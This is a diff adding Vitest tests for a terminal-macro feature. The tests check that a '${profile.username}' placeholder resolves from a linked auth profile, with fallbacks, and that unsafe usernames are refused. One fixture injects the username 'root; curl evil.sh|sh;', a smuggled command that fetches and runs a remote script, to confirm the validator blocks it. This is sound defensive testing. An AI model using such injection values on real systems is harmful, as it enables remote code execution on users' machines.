@@ -1,5 +1,5 @@
 import { beforeEach, describe, expect, it, vi } from "vitest";
-import type { ServerConfig } from "../../src/models/config";
+import type { AuthProfile, ServerConfig } from "../../src/models/config";
 import type { TerminalMacro } from "../../src/models/terminalMacro";
 import type { CommandContext } from "../../src/commands/types";
 
@@ -90,11 +90,27 @@ function context(overrides: Partial<CommandContext> = {}): CommandContext {
   return {
     core: {
       getSnapshot: () => ({ activeSessions: [], servers: [] }),
+      getAuthProfile: () => undefined,
       onDidChange: () => () => {}
     },
     sessionTerminals: new Map(),
     ...overrides
   } as unknown as CommandContext;
+}
+
+/** A context whose auth-profile lookup answers with `profiles`, keyed by id. */
+function contextWithAuthProfiles(profiles: AuthProfile[]): CommandContext {
+  return context({
+    core: {
+      getSnapshot: () => ({ activeSessions: [], servers: [] }),
+      getAuthProfile: (id: string) => profiles.find((p) => p.id === id),
+      onDidChange: () => () => {}
+    }
+  } as unknown as Partial<CommandContext>);
+}
+
+function authProfile(overrides: Partial<AuthProfile> = {}): AuthProfile {
+  return { id: "ap-1", name: "BMC accounts", username: "bmc-operator", authType: "password", ...overrides };
 }
 
 async function setMacros(macros: TerminalMacro[]): Promise<void> {
@@ -351,5 +367,105 @@ describe("nexus.server.runMacro — dispatch", () => {
 
     expect(pickServer).toHaveBeenCalled();
     expect(openExternal).toHaveBeenCalledTimes(1);
+  });
+});
+
+/**
+ * REVIEW FINDING (P2) — `${profile.username}` must name the account a SESSION
+ * would log in as. A linked auth profile takes the username over at connect time
+ * (`SilentAuthSshFactory.resolveServer` spreads `authProfileOwnedCredentials`),
+ * while the server keeps its own stored underneath the link — so reading
+ * `server.username` here puts the wrong account on the command line, in exactly
+ * the shipped `ipmitool -U ${profile.username}` case.
+ */
+describe("nexus.server.runMacro — ${profile.username} and linked auth profiles", () => {
+  const USERNAME_MACRO: TerminalMacro = {
+    id: "u",
+    name: "SOL",
+    text: "ipmitool -U ${profile.username} sol activate\n",
+    runIn: "localTerminal"
+  };
+
+  it("resolves to the LINKED PROFILE's username, not the one stored on the server", async () => {
+    await setMacros([USERNAME_MACRO]);
+    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
+
+    await runMacroOnServer(contextWithAuthProfiles([authProfile({ username: "bmc-operator" })]), {
+      // The server's own username survives beneath the link and differs — this
+      // fixture is the whole point: reading `server.username` sends "admin".
+      server: server({ username: "admin", authProfileId: "ap-1" })
+    });
+
+    expect(createdTerminals[0].sent).toEqual(["ipmitool -U bmc-operator sol activate\n"]);
+  });
+
+  it("uses the server's own username when there is no link", async () => {
+    await setMacros([USERNAME_MACRO]);
+    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
+
+    await runMacroOnServer(contextWithAuthProfiles([authProfile()]), { server: server({ username: "admin" }) });
+
+    expect(createdTerminals[0].sent).toEqual(["ipmitool -U admin sol activate\n"]);
+  });
+
+  it("falls back to the server's username when the linked profile supplies none", async () => {
+    // The connect path's precedence, mirrored exactly: `authProfileOwnedCredentials`
+    // owns `username` only when the profile supplies a USABLE one, so a blank or
+    // whitespace-only username (reachable through an imported backup) leaves the
+    // server's own standing rather than blanking it.
+    await setMacros([USERNAME_MACRO]);
+    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
+
+    await runMacroOnServer(contextWithAuthProfiles([authProfile({ username: "   " })]), {
+      server: server({ username: "admin", authProfileId: "ap-1" })
+    });
+
+    expect(createdTerminals[0].sent).toEqual(["ipmitool -U admin sol activate\n"]);
+  });
+
+  it("falls back to the server's username when the link resolves to no profile at all", async () => {
+    await setMacros([USERNAME_MACRO]);
+    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
+
+    await runMacroOnServer(contextWithAuthProfiles([]), {
+      server: server({ username: "admin", authProfileId: "ap-gone" })
+    });
+
+    expect(createdTerminals[0].sent).toEqual(["ipmitool -U admin sol activate\n"]);
+  });
+
+  it("checks the PROFILE's username against the charset, and refuses the run", async () => {
+    // The effective value flows through the same `username` charset check — that
+    // is the point: an auth profile is as importable as a server record, and the
+    // resolved line runs on the user's own machine.
+    await setMacros([USERNAME_MACRO]);
+    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
+    showErrorMessage.mockResolvedValue(undefined);
+
+    await runMacroOnServer(contextWithAuthProfiles([authProfile({ username: "root; curl evil.sh|sh;" })]), {
+      server: server({ username: "admin", authProfileId: "ap-1" })
+    });
+
+    expect(createdTerminals).toHaveLength(0);
+    expect(showErrorMessage).toHaveBeenCalled();
+    // Refused on the profile's value — never quietly resolved to the server's.
+    expect(String(showErrorMessage.mock.calls[0][0])).toContain("root; curl evil.sh|sh;");
+  });
+
+  it("flags the picker entry against the EFFECTIVE username too, so flag and refusal agree", async () => {
+    await setMacros([USERNAME_MACRO]);
+    let listed: Array<{ issue?: { token: string } }> = [];
+    showQuickPick.mockImplementation(async (items: Array<{ issue?: { token: string } }>) => {
+      listed = items;
+      return undefined;
+    });
+
+    await runMacroOnServer(contextWithAuthProfiles([authProfile({ username: "bad name" })]), {
+      // A perfectly legal `server.username`: only the profile's value is bad, so
+      // a picker built from the raw record would show no warning at all.
+      server: server({ username: "admin", authProfileId: "ap-1" })
+    });
+
+    expect(listed[0].issue?.token).toBe("username");
   });
 });
